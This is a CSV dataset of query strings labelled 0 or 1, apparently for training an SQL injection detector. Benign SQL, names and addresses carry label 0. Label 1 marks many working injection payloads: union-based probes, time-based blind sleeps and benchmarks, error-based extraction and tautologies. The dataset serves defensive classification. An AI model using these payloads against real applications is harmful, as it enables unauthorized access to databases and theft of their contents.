Query,Label
33001,0
UPDATE brick SET may = 'taste'WHERE score = 'key',0
SELECT * FROM tank WHERE house = 'secret' LIMIT 3,0
SELECT TOP 3 * FROM direction SELECT * FROM theory 3SELECT * FROM tail,0
SELECT * FROM that  WHERE suddenly = connected,0
"INSERT INTO careful  ( dropped, extra, thirty )  VALUES  ( 'length', 'were', 'been' )",0
SELECT shade ( s )  FROM yard,0
"1%""		) ) and	6414	= (		selectcount 	(*) from	rdb$fieldsas	t1,rdb$types	ast2,rdb$collations	as t3,rdb$functions as t4	)and	(	(	""%"" = """,1
"1'	)  andmake_set(	 8403 =8403,8899)  and	(		'kyxl' = 'kyxl",1
"-5313'	)	union all select	7187,7187,7187#",1
schauer,0
1		) 	where2734= 2734waitfordelay'0:0:5'--,1
"select* from	users where id =	'1'+ @	1!	union select	1,version (	)	 --	1'",1
"-4032""  )	)	or 3440 =	 cast	(	(	 chr	( 113 )  ||chr	(	 113	)	||chr	(	112	)		||chr( 	106 	)||chr  (	113 		)  )	||  ( 	select( case when (		3440=3440  )then	1 else0	end ) 	 )::text||	( chr	( 113	) ||chr ( 122)  ||chr (	118 )||chr	(122	)||chr( 113	)		)		as numeric	)	and		(	( 	 ""olox"" =	""olox",1
"1'|| (	select 'txyy' where	6500		=	 6500procedure	analyse		( extractvalue	 (9255,concat	( 	0x5c,( benchmark	(		5000000,md5 ( 0x52515a50 ) 	)	 )) ) ,1	)	) 	 ||'",1
SELECT * FROM some WHERE paint = 'composition' FETCH FIRST 3 ROWS ONLY,0
"1'	)  )			)  or	4411 	=  ( selectcount		(*	) from sysusersas	sys1,sysusersassys2,sysusersas	sys3,sysusers as sys4,sysusersas sys5,sysusers	assys6,sysusers assys7) and 	 (	(	(	'gucd'= 'gucd",1
"1"" ) where9461		=9461union	allselect	null,null,null,null,null,null,null,null,null#",1
SELECT * FROM completely WHERE naturally = 'zoo',0
SELECT COUNT ( windowID ) FROM top,0
select	 ( casewhen	(		3626 	= 	6022)	 then	3626	elsecast(	1 as int		)/	(	 select	0 fromdual )end )	 from dual--,1
"1', (	select (	case when   (	6948	=  4654)then1	else 6948*(	 select6948from mysql.db)end		)  	)",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367745 )  ORDER BY meta_id ASC",0
a4561o9nz68,0
"1	 ) )		ascusvwhere	4871=4871andelt  ( 1210=		1210,sleep(		5  ))  --",1
pozaldez,0
1 )   ) 	 	as	ctqrwhere2609		=		2609,1
SELECT * FROM scientific WHERE stage LIKE '%happy%',0
"-1526') )or	elt	 (	1032	=	1032,3623 )	 and	 ( 	 (		 'xpob' = 'xpob",1
"1 ) 	or9643	=	(	select	count (*	)from domain.domains as	t1,domain.columns ast2,domain.tables ast3) 	and (	3814=3814",1
59137152n,0
"-6292	 )	union all	select 7499,7499,7499,7499,7499,7499,7499--",1
"1'or	 (	select 2* ( if	(  ( select*from 	(	select	concat  ( 0x7171706a71,	 (  select  (  elt(		8113=8113,1 )  )			),0x717a767a71,0x78		) 	 	) 	s )	, 8446744073709551610,8446744073709551610 ) 	 )	) and	'qvyq'like'qvyq",1
"1'and8514 =   	(selectcount 	(*		)	from domain.domainsas	t1,domain.columnsas t2,domain.tablesas t3	)",1
SELECT TOP 3 * FROM tune SELECT * FROM feel 3SELECT * FROM statement,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 3836 )  ORDER BY meta_id ASC",0
"1'	  )			) 	unionall	selectnull,null,null,null,null,null,null,null,null#",1
SELECT COUNT ( tears ) FROM might,0
hervs bediaga,0
SELECT TOP 3 * FROM sent SELECT * FROM evening 3SELECT * FROM cloud,0
SELECT * FROM please WHERE wind BETWEEN 'printed' AND 'previous',0
"SELECT Orders.thusrID, Employees.yet, Employees.table FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.coverID ORDER BY Orders.deadID",0
1'	 )	 where	4949	=	4949,1
1.44E+15,0
select	(	case	when		( 3855	=	3855	) then	3855 else 1/	 (	select0 )end	 )	--,1
cremades@baltasarsantos.kn,0
4.86024E+14,0
1rlike 		( select(	case	when	 (	8314 =	 5463)	 then1	else0x28 end) 	 ),1
SELECT * FROM does WHERE four = 'understanding' LIMIT 3,0
4259,0
"c/ hermenegilda portillo, 70",0
1' ) ) )	 or6793= 	(	select6793 frompg_sleep (  5 	) 		)	 	and   (			(  ('ugrk'='ugrk,1
SELECT picture FROM vowel UNION SELECT plus FROM necessary ORDER BY coming,0
SELECT vowel ( s ) FROM burn INNER JOIN,0
lttecke,0
SELECT * FROM globe WHERE hide NOT BETWEEN 'appearance' AND 'common',0
"SELECT monkey, operation+ ', ' + finger+ ' ' + tool+ ', ' + speed AS built  FROM development",0
81383348x,0
-2431'	)or 8571  =8571--,1
"1'+  (		select'nhlx'where2291 =	2291	or ( select9173from(select count		(* )	 ,concat(0x7171706a71, ( select		( elt	(	9173	=9173,1))  )  ,0x717a767a71,floor	( rand (0) *2 ) )	x	frominformation_schema.character_sets	groupby	x  ) a)	 	) +'",1
"c/ fray diego de cadiz, 50",0
SELECT * FROM  ( SELECT locate FROM root ),0
yeste meloda,0
"select*	fromusers whereid =		1 or ""??"" or1	=	1 --1",1
masahiro,0
sa5na,0
ductilidad,0
SELECT AVG ( clear )  FROM problem  SELECT SUM ( plane ),0
nealson,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 28446,28587,28591,28618,28621,28633,28636,28691,28696,28699,28707,28710,28728,28733 )  ORDER BY meta_id ASC",0
1	and 1 =1,1
SELECT * FROM herself FETCH FIRST 3 ROWS ONLY,0
70,0
"-2190'	)where8890	= 8890 union	all	select 8890,8890#",1
SELECT * FROM man WHERE prove IN  ( SELECT are FROM way ),0
SELECT AVG ( done )  FROM ordinary  SELECT SUM ( closely ),0
5ictoriosamente,0
"select *fromusers whereid	='1'union	select	+\,@@VERSION-- 1'",1
bablica,0
"SELECT introduced,pure FROM teacher WHERE describe = 'century' UNION SELECT roll, seat FROM possible",0
1 ) where7159= 7159,1
49211,0
"-8661""union	allselect5731,5731--",1
9.16233E+15,0
"SELECT INSERT ( ""W3Schools.com"", 11, 3, ""no"" ) ;",0
"1)  and9254 	= 	(	select	count	(		*	)	 fromrdb$fields ast1,rdb$types ast2,rdb$collations	ast3,rdb$functionsas t4  )--",1
50610,0
1'+	( select	'supo' where8691	=8691,1
SELECT * FROM sign WHERE begun BETWEEN various09/01/1996steel AND into15/31/1996instance,0
"1')  )	asqwdhwhere	7581		= 7581orchar	 (		117 	)||char( 	111)	 ||char (  105 )||char	(	100	)		 =		regexp_substring	( repeat (left		(crypt_key	(	 char	 (	65	)||char( 69)	 ||char 	(	 83 	) 	,null	 ),0		) ,500000000) ,null	)	--",1
SELECT AVG ( last ) FROM tonight SELECT SUM ( make ),0
calle laguna de pealara 171 12-e,0
SELECT everybody ( s )  FROM spell FULL OUTER JOIN,0
"SELECT * FROM manner ORDER BY ten ASC, winter DESC",0
shrum@uniovivirtual.nz,0
1%'	) and4386 = utl_inaddr.get_host_address	(	 chr ( 113 )||chr ( 113		)||chr	 (		112 )	 ||chr	( 106	)||chr  (	113)|| ( select		(  case when  ( 4386 =	4386)	 then1else 0end	) 	fromdual ) ||chr(113	)	||chr(122 )||chr ( 118	)	||chr	(	122)		||chr(113  )	) 		and	 ( '%'	 =  ',1
SELECT AVG ( perfectly ) FROM band,0
"1""and(select	*	from	  (	select	 ( sleep  (	5 )	)		)	fzno ) and""gddl""like""gddl",1
1'	 )	asdqgr	where	2427	 = 2427and (	3020=3020)		*6703--,1
"1"" ) ) 		) and6055	=	ctxsys.drithsx.sn (	6055, (	 chr		(113)||chr (	113 	)	||chr		(  112		)		||chr (  106)	||chr	(113	)||	 (	select 	 (case	when	  (6055 =	6055	) then	1 else0end)fromdual		)  ||chr		(		113		) ||chr	(	122	) ||chr 	(		118 )	||chr		( 122)	||chr(113 )	 )	) 	and 		(	 ( 	 ( ""urgd""	 =	""urgd",1
maximiliano,0
1		)		 where	3979	= 3979rlike	sleep(	5  )	--,1
SELECT baseball FROM teacher UNION ALL SELECT yellow FROM does ORDER BY without,0
DELETE FROM dull,0
8.1203E+15,0
SELECT * FROM choose WHERE straw = 'wire' LIMIT 3,0
SELECT * FROM but WHERE plastic NOT LIKE '[market]%',0
SELECT column_name FROM table_name AS alias_name;,0
"iif(		5519	=  4796,1,1/0 )",1
-2951or4144 	= ( selectupper 	(	xmltype	(	chr(	60	)	 ||chr		( 58		) ||chr	(113	)||chr	(	113 )||chr( 112) ||chr	(	106) 	||chr (	113  )	||	( select 	 (casewhen  (	4144= 4144 )		then1	else0 end )	fromdual	 )||chr (	 113)	||chr	(	122) ||chr	( 118) ||chr( 122 )	 ||chr (113	)	||chr(  62)  	) )fromdual 	) #	gwqv,1
enanzar,0
"SELECT column1 , column2, ... FROM table_name WHERE NOT condition ;",0
ingelber,0
sandler,0
"select	*from userswhereid	=1or	\<$union select	1,@@VERSION-- 1",1
SELECT unhappy FROM baby UNION SELECT kill FROM cake ORDER BY arrow,0
SELECT TOP 3 * FROM hurried WHERE table = 'cow',0
SELECT AVG ( bone ) FROM bare SELECT SUM ( happily ),0
"SELECT anybody, dish, forestFROM coal WHERE apartment  IS NOT NULL",0
"1%"") 			)  or	(select* from	(	select (sleep	 (	 5	)  	))	 sddo		)	 #",1
SELECT COUNT ( second )  FROM inside,0
angeles jarama,0
69 47164 F6 reply F6 1568 0 csdf1123mVwbHk  =   9 134 e_qna eng modify 38 22747 22747 3945 556 V gallery2 view 366 3 F1 read F1 8628 80 sub0204 photo OPTOMA 218 30 02_01 1091 wr_datetime asc 2 sub0203 photo e_qna eng 8 18489 bbs338 12 view 132,0
or1in	( select @@version)		--,1
6.25668E+15,0
"-1150'	) as hdby where	4032 = 4032 union allselect4032,4032,4032,4032,4032,4032,4032,4032,4032,4032--",1
16926,0
"-5616""		) )		) 	or1570	 =	convert(	 int, (  selectchar(  113)		+char(		113		)	+char	(	112 ) +char(106)+char  (  113 ) + ( select		(	case	when (		1570	 = 1570 	)thenchar(	49) 	else	char( 48 ) 		end 	)	 		)	+char	(  113 )  +char ( 	122	) +char  (	118 ) 	+char	(	122	)+char (	113	)	 ) )  and (	 (	 ( ""hdrb"" like ""hdrb",1
psklib,0
"select	*	from users	whereid= 1 or	1#""$ union select 'a',version  (    )   -- 1",1
SELECT TOP 3 * FROM fruit WHERE met = 'religious' SELECT * FROM addition,0
-5389'||(select'gggl' where1020	=1020	unionallselect 1020#,1
thibaut,0
hi'or	'a'=		'a,1
"SELECT * FROM claws WHERE pour NOT IN  ( 'mountain', 'began', 'prove' )",0
1	)   where6304=6304,1
SELECT TOP 50 PERCENT * FROM discovery SELECT * FROM habit FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM kids,0
SELECT AVG ( sure ) FROM belt SELECT SUM ( half ),0
"select count( *)	 from	sysibm.systablesast1,sysibm.systablesas	t2,sysibm.systablesast3and(		'fwok'	like 'fwok",1
SELECT * FROM usually WHERE least = 'addition' FETCH FIRST 3 ROWS ONLY,0
"1'|| (		select'akye'	where9242 = 9242union all selectnull,null,null,null,null,null#",1
SELECT trick FROM fear UNION ALL SELECT tall FROM science ORDER BY spread,0
SELECT MIN ( service )  AS leaving FROM tales,0
SELECT TOP 3 * FROM bigger SELECT * FROM could 3SELECT * FROM wooden,0
8.62453E+15,0
SELECT scientific ( s )  FROM term UNION ALL,0
"1'		)	 as	khaa	where8157 =	8157 and	2388 =		benchmark (	5000000,md5( 0x6d457153	 ) )   #",1
49645694x,0
shing-mi,0
"1""	)  and	6969=( select 6969from pg_sleep(		5	  ) 	) 	and( ""btht"" = 	""btht",1
"SELECT Orders.dayrID, Employees.support, Employees.away FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.instanceID ORDER BY Orders.decideID",0
"1'+(  selectzfpk	where	9784 =	9784	or4411= 	 (		select count		( *		)		fromsysusersas sys1,sysusersas	sys2,sysusers as sys3,sysusers assys4,sysusers	assys5,sysusersas sys6,sysusers	as	sys7  )	  )	+'",1
"SELECT column_name ( s )  FROM show,solve",0
banderizar,0
saint-simon-vondis@paremoselalzheimer.dj,0
select*	fromuserswhere	id =	1or	$<\.or	1	=	1 --1,1
"1"" where1920 = 1920and8635 = 	 ( selectcount	(	* )			fromgenerate_series 	( 	1,5000000	 	)		 	)	 --",1
urbina granda,0
holgorio,0
avril,0
"-5207)where	6987 	=6987or1570 = convert(int,(		selectchar(	113	)	+char 	(	113 )+char(	112)+char	(  106	)	+char  (  113	 ) +	( select	(	case	when	( 1570	=	1570)thenchar(49 	)	 	else	char (  48) end 	) 	)		+char		(	 113	)	+char  (	122 )	+char	(	118		)	+char (	122	 ) 	+char	 (113  )	) 	 	)	--",1
verschuer_greenleaf@cajucar.cx,0
"-8060""	)	where	5290=	5290	or5903= 			('qqpjq'|| (	selectcase 5903when	5903then 1 else0	end	fromrdb$database)	||'qzvzq'  )	--",1
SELECT * FROM through WHERE vegetable LIKE '%universe%',0
15495714q,0
"SELECT solveID AS ID, herself AS near FROM owner",0
"INSERT INTO double ( visitor, sure, donkey, nuts, soldier, press )  VALUES  ( 'handle', 'off'. horn', 'brave', 'thirty', 'square', 'stove' )",0
9810,0
SELECT hand,0
"1	)	as skbywhere	4269 =	4269 orelt ( 6272=  6272,sleep(	5  ) 	)  --",1
SELECT AVG ( Price ) FROM zoo,0
8.61689E+15,0
SELECT * FROM  ( SELECT announced FROM knew ),0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 14594 )  ORDER BY meta_id ASC",0
casanellas berlingery,0
8232,0
28900,0
"INSERT INTO lips  ( good, jump, around )  VALUES  ( 'silk', 'income', 'throughout' )",0
"-6848""  	) )		 	or4071= 5312",1
"1"" )			 ) and3754	=	 (selectupper	 ( xmltype(	chr (	 60	)	 ||chr  (	58) 	||chr	 ( 113)	||chr	 (113)	||chr	 (	 112)||chr (106 )  ||chr	( 113 )	 ||	( select (case	when (  3754=	3754  )then1else 0end  )			from dual 	)||chr(	 113) 	||chr	 (	122 )		||chr ( 118	 )||chr( 122	 ) ||chr ( 113	)  ||chr(62 	)  	)  	)		fromdual	 )and	 	(	(	""auyv"" 	=	""auyv",1
falerno,0
"SELECT COUNT ( blanket ) , took FROM none BY seat",0
79,0
d9str7par,0
1' and6240=		 ( 'qqpjq'||	(	 select case 6240 when 6240	then 1else0 endfromrdb$database ) ||'qzvzq'),1
"1%' )		)	  ) or 8315  =  (	selectcount (	*	)		fromsysibm.systablesas	t1,sysibm.systablesast2,sysibm.systables	ast3 ) 	 and		( 	( 	(	'%'	= '",1
varley@tecnoindomo.ki,0
49694,0
"select*	from	userswhere	id	= 1or	1<@=	1unionselect1,version(	)		--1",1
"-9725') 	unionall	select 2481,2481,2481,2481,2481,2481,2481,2481,2481,2481--",1
"SELECT * FROM lovely ORDER BY practice, ship",0
"SELECT * FROM shine ORDER BY owner ASC, soon DESC",0
stanger-kitabayashi7@gestionsoftware.th,0
"1"" where7631= 	7631and 4733 = 3439",1
"INSERT INTO steady  ( kitchen, far, source )  VALUES  ( 'bear', 'ride', 'provide' )",0
"1"" orrow (	1045,7562)  > (  selectcount(*  ),concat (0x7171706a71, ( select( elt	( 1045=	1045,1 ) 	)  ),0x717a767a71,floor ( 	rand(0	)*2 )			)			x from	 (select 8488	unionselect	5584 union select3051 unionselect	1210) 	a group byx	)",1
"SELECT * FROM till WHERE garage BETWEEN ""unhappy"" AND    ""double""",0
SELECT TOP 50 PERCENT * FROM fallen,0
1' )		asrhvmwhere1420	= 1420,1
"calle alfred nobel, 42 7-g",0
SELECT * FROM represent WHERE exactly NOT LIKE 'toy%',0
1'and	4595	= 4595#,1
SELECT COS ( 2 ) ;,0
SELECT TOP 3 * FROM share WHERE grew = 'greatest' SELECT * FROM fireplace,0
"1	where6040	=	6040 and 9660=(select	count (	 * )		fromall_users t1,all_userst2,all_userst3,all_userst4,all_userst5)--",1
"1'or ( 	select 9173	from	( selectcount	( *	) ,concat(	0x7171706a71,	(	select (  elt( 9173 =		9173,1	 )	  )  	)	,0x717a767a71,floor 	(	rand(	 0 	)	 *2  )	 ) xfrom	information_schema.character_setsgroupbyx) a )and 'wwwb' = 	'wwwb",1
1' )	 where	5214  =5214,1
5.97528E+15,0
1	 )			 )  ) and3715in		 ((	char ( 	113 ) +char	( 	113 ) +char (	 112)	 +char	(106 )	 +char		(	113 ) +(select(casewhen	(3715	 =3715  )		then	char (	 49)elsechar 	(48		)	end ) 	 )+char	 ( 113)	+char ( 122 )  +char  (	 118	)	 +char(122	)  +char (		113 )  )	   )			and	( 		( 	( 9548		=	9548,1
4341,0
"1	)	 )		) 	unionallselectnull,null,null,null,null,null--",1
s-ierro,0
SELECT * FROM dozen WHERE verb NOT LIKE 'clothing%',0
shan-min,0
SELECT TOP 50 PERCENT * FROM element,0
1' andsleep	( 5		) #,1
"1"" 	)			)		and (1248	=	8705 	) *8705 and		 ((		""wvma"" like""wvma",1
3525,0
6r5int3805,0
leyton@intg.tk,0
SELECT AVG ( relationship ) FROM when SELECT SUM ( consist ),0
"selectdbms_pipe.receive_message (chr		(	66	) ||chr( 67 	)||chr( 79 )	 ||chr	(101		)	,5	)	  from dualand  (""%""= """,1
h46a00o,0
SELECT AVG ( tax ) FROM cookies SELECT SUM ( blue ),0
SELECT * FROM simplest ORDER BY butter,0
98011650w,0
SELECT AVG ( draw ) FROM help SELECT SUM ( chart ),0
"1"")		where1416  = 1416	unionall	select	null,null,null#",1
"1	and	char (  107 )	||char		( 121 ) ||char (	97	)  ||char		(80 ) 		=	regexp_substring 	(		repeat		(left(crypt_key	( 	char	(		65	)	||char 	(		69)	||char (	83  ),null 	)	,0 ),500000000 ) ,null ) --",1
boagne,0
SELECT * FROM call FETCH FIRST 50 PERCENT ROWS ONLY,0
or0= 0	--,1
rebalg1r,0
1	where 5080=	5080,1
"SELECT * FROM having WHERE planning BETWEEN ""avoid"" AND    ""lot""",0
tinti@21horas.hr,0
"-8093"" )	 	 ) 	as oboiwhere	1476 =1476 union all select1476,1476,1476,1476#",1
SELECT * FROM impossible WHERE climb = 'include'  AND  ( sky = 'snow' OR motor = 'gate' ),0
SELECT MIN ( flies )  AS discovery FROM related,0
1'  )	) 	as mbzkwhere9153  =	 9153	and2006=2006,1
SELECT test ( s )  FROM open FULL OUTER JOIN,0
SELECT * FROM surface WHERE trap = 'iron',0
"calle profesor angel lacalle, s/n,",0
"-8144'  ) where	1691 	= 	1691orelt(  7246=	 7816,7816 )--",1
1' ) and 4386	=utl_inaddr.get_host_address(	chr(	113	)	||chr		(	 113 	)	||chr	(		112 ) ||chr(	106 )||chr ( 113	) ||	(		select (casewhen	(	4386=	 4386		) then1else0	end)  	fromdual ) ||chr(  113	) ||chr		( 122	 )||chr(118	)||chr 	(	122)	 ||chr  (113 ))	 and	 ( 	'sgdj'like'sgdj,1
"-4955%' unionallselect5928,5928--",1
"1""	or	(	select9173	from	( selectcount ( * 	)	,concat	 (	0x7171706a71,	(	 select (  elt (	9173		= 9173,1	) 	)			) 	,0x717a767a71,floor(	rand 	(	0	)	*2 )	)xfrominformation_schema.character_setsgroupby	x	) a )and ""bkrk""	=""bkrk",1
hymen_israeli@aulahost.vc,0
"SELECT * FROM he ORDER BY usually ASC, rapidly DESC",0
"1orextractvalue	(1297,concat	(  0x5c,0x7171706a71, 	( select( elt (1297  =	1297,1	)	  ) ) ,0x717a767a71 )	 	)	-- uslt",1
1'	andsleep ( 5 )			and 'kapr'=	'kapr,1
prell@davidymamen.tc,0
"1')	and	updatexml	( 3393,concat (	0x2e,0x7171706a71,( select	(elt ( 3393 =3393,1		))		 )	,0x717a767a71 	),1161) and		(	 'dtym'	= 'dtym",1
SELECT * FROM climate 3,0
1')	and1987 =	 3756#,1
SELECT * FROM collect WHERE newspaper BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT column_name FROM table1 UNION,0
azuqueca de henares,0
"1""		 )  )				)	  unionallselect	null--",1
"1'	where	5786=	5786	and elt(1210= 1210,sleep	(5) 		)--",1
"1)  where 1013 	=	1013 and4241	=  convert ( int, (		select char		(  113	) +char ( 113  )	+char(112 )  +char (106	)+char	(	113	) + 	( select	( 	casewhen(	 4241 = 4241	)  thenchar	(49  )		elsechar	(	48	)  	end )	 	)	+char (113	) +char		( 122	)	+char(	118 )+char	(122 )	+char 	(	113	)	 )	 )	 --",1
"1'||(select'yaii'	from dualwhere	7317	= 7317 union all	selectnull,null,null,null,null,null,null,null,null#",1
DELETE FROM tomorrow WHERE solar = 'to',0
"1 or	5356 =	 (	select	count  (	*	) 	fromsysusers as sys1,sysusersassys2,sysusers	as sys3,sysusersassys4,sysusersassys5,sysusers assys6,sysusersas	sys7	)--",1
"c/ gustavo adolfo becquer 91,",0
SELECT * FROM said FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM sunlight,0
SELECT * FROM chapter,0
"-7491""	)ascnrn where 3635	=	3635	order	by	1#",1
1'where	8729=8729,1
"1' where8837	=8837and	5556	=		  ( 	selectcount ( *	 )		from all_users	t1,all_users	t2,all_users	t3,all_users	t4,all_users	t5	)--",1
ludolfo,0
SELECT park ( s )  FROM contrast LEFT JOIN,0
"-9032 	) 		 ) unionallselect8377,8377,8377,8377,8377,8377,8377,8377,8377#",1
19262,0
"SELECT satisfiedID AS ID, skill AS press FROM poetry",0
"SELECT them, control+ ', ' + slabs+ ' ' + upward+ ', ' + chosen AS name  FROM everything",0
"SELECT * FROM solve ORDER BY more, terrible",0
botosso@mytanga.cf,0
SELECT * FROM watch FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM remember,0
oretana,0
SELECT * FROM since FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM toward,0
c26ve7sar,0
SELECT * FROM  ( SELECT service FROM series ),0
"1'||	(	 select 'jonh'	from dual where2415		= 	2415union all selectnull,null,null,null,null,null,null,null,null--",1
SELECT * FROM yourself WHERE degree = 'nest' LIMIT 3,0
laureano,0
28609,0
"1""		) )	union	all selectnull,null,null,null,null,null,null,null--",1
"admin"")		or ( ""1""=	""1""--",1
"1%""	)	union	all selectnull,null,null,null,null#",1
passatge de manyer 105,0
SELECT * FROM shelf WHERE ever BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT COUNT ( climate )  FROM attack,0
33s4h9929r,0
DELETE FROM rubber WHERE how = 'dirty',0
"SELECT pony AS vessels, dig AS [matter]  FROM anyway",0
SELECT * FROM equator WHERE quickly = 'cloth' FETCH FIRST 3 ROWS ONLY,0
1  )	 ) 		) 	and4386=  utl_inaddr.get_host_address  (	chr (  113	)	||chr	( 	113  )	||chr		( 	112	)	 ||chr (	106 )	||chr(113 )	||(select (case when ( 4386= 4386)	then	1	else0	end	) 	from dual) ||chr( 113)	||chr  ( 122)	 ||chr 	(  118 	) ||chr(122 )	||chr ( 113	 ) ) 		and ( 	 (		(	8023	= 8023,1
fulmer,0
SELECT * FROM sun WHERE swimming = 'material' FETCH FIRST 3 ROWS ONLY,0
"-3649""		) 	)	aseyduwhere 3220 	=		3220	orelt(	 8705	=	1510,1510 )  --",1
-3956')or	(		8459	= 8459  ) 	*4906and  ('rflo'like'rflo,1
"SELECT Orders.paintrID, Employees.friend, Employees.opportunity FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.feltID ORDER BY Orders.totalID",0
SELECT DISTINCT sides FROM wire,0
7118,0
1	 ) 		where7680	= 	7680	and7756 =	dbms_utility.sqlid_to_sqlhash  (			(	chr	( 113)||chr	(113  ) 	||chr		( 	112	)||chr	( 106	)	 ||chr 	(	 113) || 	(		select 	( casewhen	 ( 7756	= 7756 )		then	1else	0 end 	)fromdual )		||chr	 (113	)  ||chr	(	122  )  ||chr(	118	) ||chr	 (		122 )	||chr(		113 		)	) 	)--,1
"1	)	 )  asxutuwhere	5811=	5811or char(	75	)	||char	(	70  ) ||char  (99	) ||char	(  83)		= 	regexp_substring (	 repeat	 ( left (crypt_key	( char(65		)	||char	 (69	) ||char	(		83		),null  )		,0 	)  ,500000000) ,null)--",1
nab,0
SELECT * FROM living,0
46842,0
46225556h,0
SELECT * FROM together WHERE somehow = 'previous',0
SELECT * FROM summer WHERE jungle IN  ( SELECT push FROM fence ),0
erny1,0
18179,0
ddimo,0
SELECT surprise FROM purpose,0
87811832v,0
"1'union	all	select	null,null,null#",1
31587,0
gracindo@ajuntamentbcn2-0.jp,0
"1)	union	allselect null,null,null,null,null,null,null,null,null,null#",1
1'+	(selectsomnwhere8636		=	8636rlikesleep	(	 5 )		 )+',1
"1 	) and elt(4249 =	4249,7259)",1
SELECT AVG ( Price ) FROM spread,0
SELECT AVG ( Price ) FROM breathe,0
"1'  ) or8514=	benchmark (5000000,md5		(  0x544d5a4c   ) 	)	 	#",1
96761343k,0
"-6733' 	) where4024 =	4024 unionall select4024,4024,4024,4024#",1
SELECT MIN ( bag )  AS engineer FROM jump,0
"select	*fromuserswhereid	=		1	-@<@ union	select null,version	(	  	) 	--1",1
SELECT * FROM snow WHERE brick BETWEEN 'how' AND 'has',0
"1%' union all selectnull,null,null,null,null,null,null,null,null#",1
"-3151%""  )  	)			  ) union allselect	6250,6250,6250,6250,6250,6250,6250,6250,6250,6250#",1
73361115q,0
SELECT COUNT ( reportID ) FROM swimming,0
"1"" )  )	 or	5286  = 	 	( 	select count (	*  )		 fromall_userst1,all_users t2,all_userst3,all_users	t4,all_users	t5)and  	( 		(	""lano""= ""lano",1
SELECT * FROM  ( SELECT bet FROM orange ),0
"1"" )	where8254= 	8254and	char(107 )	||char ( 121 	)||char(	 97)	||char ( 80)	 =	regexp_substring	(repeat (  left		(	crypt_key 	( char (	65 )	||char	(  69		) ||char  (	 83	 )		,null	)	,0)	,500000000  )	,null )--",1
"1"" 	)		) as riui where	2605 = 2605",1
"SELECT are, zulu+ ', ' + practical+ ' ' + hour+ ', ' + beside AS correctly  FROM go",0
36lis8r,0
"1' )		where7646 =	7646and 3580= (select	count(	*)	fromdomain.domainsas t1,domain.columns	ast2,domain.tables as	t3	)--",1
SELECT map ( s )  FROM outside LEFT JOIN,0
1'+  (	 select tzvm where5145=	5145	and4192	=		7437#,1
SELECT something FROM completely UNION ALL SELECT broken FROM welcome ORDER BY lamp,0
DELETE FROM thumb WHERE rise = 'review',0
-1459'  )			 ) 		)	 or5903 =(  'qqpjq'||		(		selectcase 5903when 5903	then1	else0end from rdb$database	 )  ||'qzvzq') and		( 	((		'eiet'like'eiet,1
SELECT bowl ( s )  FROM piano,0
-4542' 	) 	 )	 orderby	1#,1
1'and9198	= 9198--,1
1052,0
SELECT AVG ( conversation ) FROM plenty,0
1'	and2316	=		7236,1
SELECT AVG ( pen ) FROM sand SELECT SUM ( maybe ),0
&1c,1
SELECT TOP 3 * FROM halfway SELECT * FROM slide 3SELECT * FROM desk,0
SELECT TOP 3 * FROM equipment,0
SELECT * FROM upward WHERE sound LIKE '%out%',0
1'		)) 	  )and	  ( 3020 	=	3020) 	*6703	and			(	 	(		('nhrc'	like'nhrc,1
"SELECT column_name ( s )  FROM seat,labor",0
SELECT * FROM dirt FETCH FIRST 50 PERCENT ROWS ONLY,0
SELECT AVG ( melted ) FROM greatly,0
"1,  ( select (	case	when 	(		5217= 5217 )			then1	else 5217* (select	5217frommysql.db)	end ) )",1
SELECT option_value FROM wp_options WHERE option_name  =  'can_compress_scripts' LIMIT 1,0
UPDATE serve SET official = 'colony'WHERE labor = 'dark',0
open3,0
